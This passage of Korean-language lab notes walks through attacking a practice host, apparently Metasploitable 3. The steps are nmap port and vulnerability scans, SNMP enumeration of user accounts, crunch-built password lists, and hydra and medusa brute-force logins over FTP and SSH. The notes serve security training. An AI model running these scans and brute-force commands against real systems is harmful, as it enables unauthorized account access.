### 2단계: 대상 정찰 (nmap)
```bash
# TCP 포트 스캔 + OS 탐지 (기본 포트)
nmap -sT -v -O 10.0.0.31

# UDP 포트 스캔 + OS 탐지
nmap -sU -v -O 10.0.0.31

# TCP 전체 포트(0~65535) 스캔 → 결과 파일 저장
nmap -sT -v -O -p0-65535 10.0.0.31 > metas3.txt

# UDP 전체 포트 스캔 → 기존 파일에 추가
nmap -sU -v -O -p0-65535 10.0.0.31 >> metas3.txt

# FTP 브루트포스 스크립트 실행
nmap --script ftp-brute.nse 10.0.0.31

# SMB 취약점 전체 점검
nmap --script smb-vuln* 10.0.0.31
```

> `-sT` TCP / `-sU` UDP / `-v` 상세출력 / `-O` OS탐지 / `-p0-65535` 전체포트

### 3단계: SNMP 정보 수집 → 계정 목록 확보
```bash
# Windows에서 먼저 설정 필요:
# services.msc → SNMP Service → 속성(보안) → 커뮤니티명 추가 (예: sgm)

# SNMP로 대상 시스템 정보 수집 (-c: 커뮤니티명)
snmp-check -c sgm 10.0.0.31
# 결과 중 [*] User accounts 섹션에서 계정 목록 추출

# 추출한 계정들을 파일로 저장
vi user.txt
# (sshd, Guest, han_solo, darth_vader ... 등 입력)
```

### 4단계: 비밀번호 wordlist 생성
```bash
# crunch: 1~4자리 숫자 조합 생성 → 파일 저장
crunch 1 4 0123456789 > pass.txt

# rainbowcrack 문자셋 활용 (영문+숫자 조합)
apt install -y rainbowcrack
find / -name charset.txt                          # 문자셋 파일 위치 확인
vi /usr/share/rainbowcrack/charset.txt            # 문자셋 확인

crunch 1 4 -f /usr/share/rainbowcrack/charset.txt alpha-numeric > pass.txt # 영문+숫자
crunch 1 4 -f /usr/share/rainbowcrack/charset.txt ascii-32-95 > pass.txt # 특수문자 포함
```

### 5단계: 브루트포스 공격 (계정 크래킹)
```bash
# hydra: user.txt × pass.txt 조합으로 FTP 로그인 시도
hydra -L user.txt -P pass.txt ftp://10.0.0.31

# medusa: 같은 방식으로 FTP 시도, SUCCESS만 필터링
medusa -U user.txt -P pass.txt -h 10.0.0.31 -M ftp | grep SUCCESS

# SSH도 동일하게 시도
hydra -L user.txt -P pass.txt ssh://10.0.0.31
medusa -U user.txt -P pass.txt -h 10.0.0.31 -M ssh

# 크래킹 성공한 계정으로 직접 FTP 접속
ftp 10.0.0.31
```
